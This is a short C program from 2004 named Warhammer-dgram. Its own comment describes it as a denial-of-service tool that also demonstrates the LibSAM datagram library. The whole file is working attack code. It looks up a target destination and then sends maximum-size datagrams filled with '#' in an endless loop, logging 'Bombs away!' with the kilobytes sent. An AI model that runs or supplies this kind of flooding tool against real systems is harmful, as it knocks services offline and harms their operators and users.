/*
 * Copyright (c) 2004, Matthew P. Cashdollar <mpc@innographx.com>
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 * 
 *     * Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *     * Neither the name of the author nor the names of any contributors
 * may be used to endorse or promote products derived from this software
 * without specific prior written permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
 * IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
 * OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Warhammer-dgram: a simple denial of service tool which uses datagrams, and
 * illustrates how LibSAM works.
 * Use only with the utmost courtesy.
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sam.h"

static void dgramback(sam_pubkey_t dest, void *data, size_t size);
static void diedback(void);
static void logback(char *s);
static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result);

bool gotdest = false;
sam_pubkey_t dest;

int main(int argc, char* argv[])
{
	if (argc != 2) {
		fprintf(stderr, "Syntax: %s <b64dest|name>\n", argv[0]);
		return 1;
	}

	sam_dgramback = &dgramback;
	sam_diedback = &diedback;
	sam_logback = &logback;
	sam_namingback = &namingback;

	/* a tunnel length of 2 is the default - adjust to your preference   vv */
	samerr_t rc = sam_connect("localhost", 7656, "TRANSIENT", SAM_DGRAM, 2);
	if (rc != SAM_OK) {
		fprintf(stderr, "SAM connection failed: %s\n", sam_strerror(rc));
		exit(1);
	}

	if (strlen(argv[1]) == 516) {
		memcpy(dest, argv[1], SAM_PUBKEY_LEN);
		gotdest = true;
	}
	else
		sam_naming_lookup(argv[1]);

	while (!gotdest)
		sam_read_buffer();

	char data[SAM_DGRAM_PAYLOAD_MAX];
	memset(data, '#', SAM_DGRAM_PAYLOAD_MAX);
	size_t sentbytes = 0;
	while (true) {
		rc = sam_dgram_send(dest, data, SAM_DGRAM_PAYLOAD_MAX);
		if (rc != SAM_OK) {
			fprintf(stderr, "sam_dgram_send() failed: %s\n", sam_strerror(rc));
			return 1;
		}
		sentbytes += SAM_DGRAM_PAYLOAD_MAX;
		printf("Bombs away! (%u kbytes sent so far)\n", sentbytes / 1024);
		sam_read_buffer();
	}

	return 0;
}

static void dgramback(sam_pubkey_t dest, void *data, size_t size)
{
	puts("Received a datagram (ignored)");
	free(data);
}

static void diedback(void)
{
	fprintf(stderr, "Lost SAM connection!\n");
	exit(1);
}

static void logback(char *s)
{
	fprintf(stderr, "LibSAM: %s\n", s);
}

static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result)
{
	if (result != SAM_OK) {
		fprintf(stderr, "Naming lookup failed: %s\n", sam_strerror(result));
		exit(1);
	}
	memcpy(dest, pubkey, SAM_PUBKEY_LEN);
	gotdest = true;
}
